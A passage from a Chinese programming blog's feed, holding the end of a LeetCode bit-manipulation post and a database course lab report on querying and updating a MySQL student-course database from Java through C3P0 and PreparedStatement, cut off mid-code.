class="hljs-keyword">return</span> cnt;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度O(1)</li><li>位运算</li></ul><h2 id="第-14-天-位运算"><a href="#第-14-天-位运算" class="headerlink" title="第 14 天 位运算"></a>第 14 天 位运算</h2><h3 id="190-颠倒二进制位"><a href="#190-颠倒二进制位" class="headerlink" title="190. 颠倒二进制位"></a><a href="https://leetcode.cn/problems/reverse-bits/">190. 颠倒二进制位</a></h3><p>颠倒给定的 32 位无符号整数的二进制位。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">reverseBits</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> n)</span> </span>&#123;<br>        <span class="hljs-type">uint32_t</span> ans=<span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> t=<span class="hljs-number">32</span>;<br>        <span class="hljs-keyword">while</span>(t--)<br>        &#123;<br>            ans&lt;&lt;=<span class="hljs-number">1</span>;<br>            ans+=n&amp;<span class="hljs-number">1</span>;<br>            n&gt;&gt;=<span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>时间复杂度O(1)</li><li>位运算</li></ul><h3 id="136-只出现一次的数字"><a href="#136-只出现一次的数字" class="headerlink" title="136. 只出现一次的数字"></a><a href="https://leetcode.cn/problems/single-number/">136. 只出现一次的数字</a></h3><p>给定一个非空整数数组，除了某个元素只出现一次以外，其余每个元素均出现两次。找出那个只出现了一次的元素。</p><p>说明：</p><p>你的算法应该具有线性时间复杂度。 你可以不使用额外空间来实现吗？</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">//相同的数异或为0</span><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">singleNumber</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;nums.<span class="hljs-built_in">size</span>();i++)<br>        &#123;<br>            ans^=nums[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>位运算，数组</li></ul>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>Leetcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《数据库系统概论》课程之实验六 通过嵌入式SQL访问数据库</title>
    <link href="/2022/05/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%85%AD%20%E9%80%9A%E8%BF%87%E5%B5%8C%E5%85%A5%E5%BC%8FSQL%E8%AE%BF%E9%97%AE%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <url>/2022/05/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%85%AD%20%E9%80%9A%E8%BF%87%E5%B5%8C%E5%85%A5%E5%BC%8FSQL%E8%AE%BF%E9%97%AE%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    
    <content type="html"><![CDATA[<h1 id="《数据库系统概论》课程之实验六-通过嵌入式SQL访问数据库"><a href="#《数据库系统概论》课程之实验六-通过嵌入式SQL访问数据库" class="headerlink" title="《数据库系统概论》课程之实验六 通过嵌入式SQL访问数据库"></a>《数据库系统概论》课程之实验六 通过嵌入式SQL访问数据库</h1><h2 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1 实验目的"></a>1 实验目的</h2><p>熟悉通过嵌入式SQL（主语言为JAVA语言）编程访问数据库</p><h2 id="2-实验平台和实验工具"><a href="#2-实验平台和实验工具" class="headerlink" title="2 实验平台和实验工具"></a>2 实验平台和实验工具</h2><p>在MySQL数据库管理系统上，通过Java语言编写访问数据库的应用程序来对数据库进行各种数据操作。</p><p>编程工具:IDEA 2022.1</p><h2 id="3-实验内容和要求"><a href="#3-实验内容和要求" class="headerlink" title="3 实验内容和要求"></a>3 实验内容和要求</h2><p>通过嵌入式SQL编程访问数据库的基本步骤</p><p>对学生课程数据库中的表，完成下面功能（你也可以自己给出功能要求）：</p><ul><li>查询某一门课程的信息。要查询的课程由用户在程序运行过程中指定，放在主变量中。</li><li>查询选修某一门课程的选课信息，要查询的课程号由用户在程序运行过程中指定，放在主变量中，然后根据用户的要求修改其中某些记录的成绩字段。</li></ul><h3 id="代码设计思路："><a href="#代码设计思路：" class="headerlink" title="代码设计思路："></a>代码设计思路：</h3><ul><li>通过基于jdbc驱动的数据库C3P0连接池，实现与数据库的连接。</li><li>使用Statement接口用于执行静态的SQL语句。</li><li>使用PreparedStatement接口，结合占位符？，执行含参的SQL语句。</li><li>使用ResultSet保存查询结果。</li></ul><blockquote><p>主要类和函数如下</p></blockquote><h4 id="C3P0Util类："><a href="#C3P0Util类：" class="headerlink" title="C3P0Util类："></a>C3P0Util类：</h4><ul><li><code>public static Connection getConnection()</code>：通过C3P0连接池与数据库建立连接</li><li><code>public static void release(Connection conn)</code>：释放连接回连接池</li></ul><h4 id="CourseDao类："><a href="#CourseDao类：" class="headerlink" title="CourseDao类："></a>CourseDao类：</h4><ul><li><code>public static void showCname()</code>：查询课程号、课程名，以给用户选择</li><li><code>public static void QueryOne(Integer Cno)</code>：查询某一门课程的信息，变量为课程号Cno</li></ul><h4 id="SCDao类："><a href="#SCDao类：" class="headerlink" title="SCDao类："></a>SCDao类：</h4><ul><li><code>public static void QueryOne(Integer Cno)</code>：查询选修某一门课程的选课信息，变量为课程号Cno</li><li><code>public static void UpdateOne(String Sno, Integer Cno, Integer Grade)</code>：根据用户的要求修改其中某些记录的成绩字段，变量为学号Sno，课程号Cno，成绩Grade</li></ul><h4 id="run类："><a href="#run类：" class="headerlink" title="run类："></a>run类：</h4><ul><li><code>public static void main(String[] args)</code>：主函数实现功能逻辑</li></ul><h2 id="4-实验结果"><a href="#4-实验结果" class="headerlink" title="4 实验结果"></a>4 实验结果</h2><p>代码运行结果如下：</p><h4 id="主页面"><a href="#主页面" class="headerlink" title="主页面"></a>主页面</h4><p> <img src="/2022/05/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%85%AD%20%E9%80%9A%E8%BF%87%E5%B5%8C%E5%85%A5%E5%BC%8FSQL%E8%AE%BF%E9%97%AE%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220508151430815.png" alt="image-20220508151430815"></p><h4 id="查询某一门课程的信息"><a href="#查询某一门课程的信息" class="headerlink" title="查询某一门课程的信息"></a>查询某一门课程的信息</h4><p> <img src="/2022/05/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%85%AD%20%E9%80%9A%E8%BF%87%E5%B5%8C%E5%85%A5%E5%BC%8FSQL%E8%AE%BF%E9%97%AE%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220508151536707.png" alt="image-20220508151536707"></p><h4 id="查询选修某一门课程的选课信息"><a href="#查询选修某一门课程的选课信息" class="headerlink" title="查询选修某一门课程的选课信息"></a>查询选修某一门课程的选课信息</h4><p> <img src="/2022/05/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%85%AD%20%E9%80%9A%E8%BF%87%E5%B5%8C%E5%85%A5%E5%BC%8FSQL%E8%AE%BF%E9%97%AE%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220508151711244.png" alt="image-20220508151711244"></p><h4 id="修改其中某些记录的成绩字段"><a href="#修改其中某些记录的成绩字段" class="headerlink" title="修改其中某些记录的成绩字段"></a>修改其中某些记录的成绩字段</h4><p> <img src="/2022/05/08/%E3%80%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA%E3%80%8B%E8%AF%BE%E7%A8%8B%E4%B9%8B%E5%AE%9E%E9%AA%8C%E5%85%AD%20%E9%80%9A%E8%BF%87%E5%B5%8C%E5%85%A5%E5%BC%8FSQL%E8%AE%BF%E9%97%AE%E6%95%B0%E6%8D%AE%E5%BA%93/image-20220508151755858.png" alt="image-20220508151755858"></p><h2 id="实验心得"><a href="#实验心得" class="headerlink" title="实验心得"></a>实验心得</h2><p>通过这次实验，我掌握了如何Java语言编写访问数据库管理系统MySQL,来对数据库进行各种数据操作。有以下几点需要注意：</p><ul><li><p>数据库查询的接口<code>Statement</code>可用于执行固定的SQL语句。执行函数<code>executeUpdate()</code>用于执行增、删、改等SQL语句，而<code>executeQuery()</code>用于执行查询语句，对于<code>Statement</code>，需要加上SQL语句作为参数。</p></li><li><p><code>PreparedStatement</code>继承了<code>Statement</code>，但它在通过<code>Connection</code>的类函数<code>prepareStatement</code>定义时就已经预编译，参数SQL语句中可以含有<code>?</code>作为占位符，后续用于填充变量。完成变量填入后，在<code>executeUpdate()</code>或<code>executeQuery()</code>中就不需要以SQL语句作为参数。</p></li><li>查询的返回结果将保存在<code>ResultSet</code>类的变量中。若要遍历读取该结果，则需要在定义数据库查询接口时加入2个参数：<code>TYPE_SCROLL_INSENSITIVE</code>：游标双向滚动，但不及时更新；<code>CONCUR_READ_ONLY</code>：只读</li><li><code>C3P0</code>封装了<code>jdbc</code>对<code>DataSource</code>接口的实现，本实验正是通过<code>C3P0</code>连接池实现了对MySQL数据库的连接。需要额外注意，当建立连接后，若长时间未使用该连接，要及时将连接释放回连接池，并在连接释放前通过<code>close()</code>把<code>Statement</code>、<code>PrepareStatement</code>、<code>ResultSet</code>的资源释放。</li></ul><h2 id="附-关键代码"><a href="#附-关键代码" class="headerlink" title="附 关键代码"></a>附 关键代码</h2><h3 id="与数据库连接"><a href="#与数据库连接" class="headerlink" title="与数据库连接"></a>与数据库连接</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0Util</span> &#123;<br>    <span class="hljs-comment">//c3p0封装了jdbc对DataSource接口的实现</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComboPooledDataSource</span>();<br><br>    <span class="hljs-comment">//从连接池中获取连接</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//返回连接</span><br>            <span class="hljs-keyword">return</span> dataSource.getConnection();<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            <span class="hljs-comment">// TODO Auto-generated catch block</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//释放连接回连接池</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">(Connection conn)</span> &#123;<br>        <span class="hljs-keyword">if</span> (conn != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                conn.close();<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>            conn = <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="对数据库进行操作"><a href="#对数据库进行操作" class="headerlink" title="对数据库进行操作"></a>对数据库进行操作</h3><h4 id="CourseDao类：-1"><a href="#CourseDao类：-1" class="headerlink" title="CourseDao类："></a>CourseDao类：</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CourseDao</span> &#123;<br>    <span class="hljs-comment">//查询课程号、课程名，以给用户选择</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">showCname</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-comment">// 建立连接</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> C3P0Util.getConnection();<br>        <span class="hljs-comment">// 查询语句</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select Cno,Cname from Course&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//定义数据库查询的接口（TYPE_SCROLL_INSENSITIVE：游标双向滚动，但不及时更新；CONCUR_READ_ONLY：只读）</span><br>            <span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> conn.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY);<br>            <span class="hljs-comment">//执行查询，得到结果</span><br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> stmt.executeQuery(sql);<br>            <span class="hljs-keyword">if</span> (result.first()) &#123;<br>                <span class="hljs-comment">// 输出表头</span><br>                System.out.printf(<span class="hljs-string">&quot;|%-8s|%-16s|\n&quot;</span>, <span class="hljs-string">&quot;Cno&quot;</span>, <span class="hljs-string">&quot;Cname&quot;</span>);<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">3</span> + <span class="hljs-number">8</span> + <span class="hljs-number">16</span> + <span class="hljs-number">1</span>; i++) &#123;<br>                    System.out.print(<span class="hljs-string">&quot;-&quot;</span>);<br>                &#125;<br>                System.out.print(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>                <span class="hljs-comment">// 输出结果</span><br>                <span class="hljs-keyword">do</span> &#123;<br>                    <span class="hljs-type">Integer</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> result.getInt(<span class="hljs-string">&quot;Cno&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> result.getString(<span class="hljs-string">&quot;Cname&quot;</span>);<br>                    System.out.printf(<span class="hljs-string">&quot;|%-8d&quot;</span>, c1);<br>                    System.out.printf(<span class="hljs-string">&quot;|%-16s&quot;</span>, c2);<br>                    System.out.print(<span class="hljs-string">&quot;|\n&quot;</span>);<br>                &#125; <span class="hljs-keyword">while</span> (result.next());<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">3</span> + <span class="hljs-number">8</span> + <span class="hljs-number">16</span> + <span class="hljs-number">1</span>; i++) &#123;<br>                    System.out.print(<span class="hljs-string">&quot;-&quot;</span>);<br>                &#125;<br>                System.out.print(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;Course表为空&quot;</span>);<br>            &#125;<br>            <span class="hljs-comment">//释放资源</span><br>            stmt.close();<br>            result.close();<br>            conn.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//查询某一门课程的信息，变量为课程号Cno</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">QueryOne</span><span class="hljs-params">(Integer Cno)</span> &#123;<br>        <span class="hljs-comment">// 建立连接</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> C3P0Util.getConnection();<br>        <span class="hljs-comment">// 查询语句，一个变量待定</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from Course where Cno = ?&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 预处理接口</span><br>            <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstmt</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql,ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY); <span class="hljs-comment">// 结果集的游标可以上下移动</span><br>            <span class="hljs-comment">// 填入变量</span><br>            pstmt.setInt(<span class="hljs-number">1</span>, Cno);<br>            <span class="hljs-comment">//执行查询，得到结果</span><br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> pstmt.executeQuery();<br>            <span class="hljs-keyword">if</span> (result.first()) &#123;<br>                <span class="hljs-comment">// 输出表头</span><br>                System.out.printf(<span class="hljs-string">&quot;|%-8s|%-16s|%-8s|%-8s|\n&quot;</span>, <span class="hljs-string">&quot;Cno&quot;</span>, <span class="hljs-string">&quot;Cname&quot;</span>, <span class="hljs-string">&quot;Cpn&quot;</span>, <span class="hljs-string">&quot;Ccredit&quot;</span>);<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5</span> + <span class="hljs-number">8</span> * <span class="hljs-number">3</span> + <span class="hljs-number">16</span> + <span class="hljs-number">1</span>; i++) &#123;<br>                    System.out.print(<span class="hljs-string">&quot;-&quot;</span>);<br>                &#125;<br>                System.out.print(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>                <span class="hljs-comment">// 输出结果</span><br>                <span class="hljs-keyword">do</span> &#123;<br>                    <span class="hljs-type">Integer</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> result.getInt(<span class="hljs-string">&quot;Cno&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> result.getString(<span class="hljs-string">&quot;Cname&quot;</span>);<br>                    <span class="hljs-type">Integer</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> result.getInt(<span class="hljs-string">&quot;Cpno&quot;</span>);<br>                    <span class="hljs-type">Integer</span> <span class="hljs-variable">c4</span> <span class="hljs-operator">=</span> result.getInt(<span class="hljs-string">&quot;Ccredit&quot;</span>);<br>                    System.out.printf(<span class="hljs-string">&quot;|%-8d&quot;</span>, c1);<br>                    System.out.printf(<span class="hljs-string">&quot;|%-16s&quot;</span>, c2);<br>                    System.out.printf(<span class="hljs-string">&quot;|%-8d&quot;</span>, c3);<br>                    System.out.printf(<span class="hljs-string">&quot;|%-8d&quot;</span>, c4);<br>                    System.out.print(<span class="hljs-string">&quot;|\n&quot;</span>);<br>                &#125; <span class="hljs-keyword">while</span> (result.next());<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5</span> + <span class="hljs-number">8</span> * <span class="hljs-number">3</span> + <span class="hljs-number">16</span> + <span class="hljs-number">1</span>; i++) &#123;<br>                    System.out.print(<span class="hljs-string">&quot;-&quot;</span>);<br>                &#125;<br>                System.out.print(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                System.out.printf(<span class="hljs-string">&quot;课程 %s 不存在!\n&quot;</span>,Cno);<br>            &#125;<br>            <span class="hljs-comment">//释放资源</span><br>            pstmt.close();<br>            result.close();<br>            conn.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="SCDao类"><a href="#SCDao类" class="headerlink" title="SCDao类"></a>SCDao类</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SCDao</span> &#123;<br>    <span class="hljs-comment">//查询选修某一门课程的选课信息</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">QueryOne</span><span class="hljs-params">(Integer Cno)</span> &#123;<br>        <span class="hljs-comment">// 建立连接</span><br>        <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> C3P0Util.getConnection();<br>        <span class="hljs-comment">// 查询语句，一个变量待定</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from SC where Cno = ?&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 预处理接口</span><br>            <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstmt</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql, ResultSet.TYPE_SCROLL_INSENSITIVE, ResultSet.CONCUR_READ_ONLY); <span class="hljs-comment">// 结果集的游标可以上下移动</span><br>            <span class="hljs-comment">// 填入变量</span><br>            pstmt.setInt(<span class="hljs-number">1</span>, Cno);<br>            <span class="hljs-comment">//执行查询，得到结果</span><br>            <span class="hljs-type">ResultSet</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> pstmt.executeQuery();<br>            <span class="hljs-keyword">if</span> (result.first()) &#123;<br>                <span class="hljs-comment">// 输出表头</span><br>                System.out.printf(<span class="hljs-string">&quot;课程 %s 的信息如下:\n&quot;</span>,Cno);<br>                System.out.printf(<span class="hljs-string">&quot;|%-16s|%-8s|%-8s|\n&quot;</span>, <span class="hljs-string">&quot;Sno&quot;</span>, <span class="hljs-string">&quot;Cno&quot;</span>, <span class="hljs-string">&quot;Grade&quot;</span>);<br>                <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">4</span> + <span class="hljs-number">8</span> * <span class="hljs-number">2</span> + <span class="hljs-number">16</span> + <span class="hljs-number">1</span>; i++) &#123;<br>                    System.out.print(<span class="hljs-string">&quot;-&quot;</span>);<br>                &#125;<br>                System.out.print(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>                <span class="hljs-comment">// 输出结果</span><br>                <span class="hljs-keyword">do</span> &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> result.getString(<span class="hljs-string">&quot;Sno&quot;</span>);<br>                    <span class="hljs-type">Integer</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> result.getInt(<span class="hljs-string">&quot;Cno&quot;</span>);<br>                    <span class="hljs-type">Integer</span> <span class="hljs-variable">c3</span> <span class="hljs-operator">=</span> result.getInt(<span class="hljs-string">&quot;Grade&quot;</span>);<br>                    System.out.printf(<span class="hljs-string">&quot;|%-16s&quot;</span>, c1);<br>                    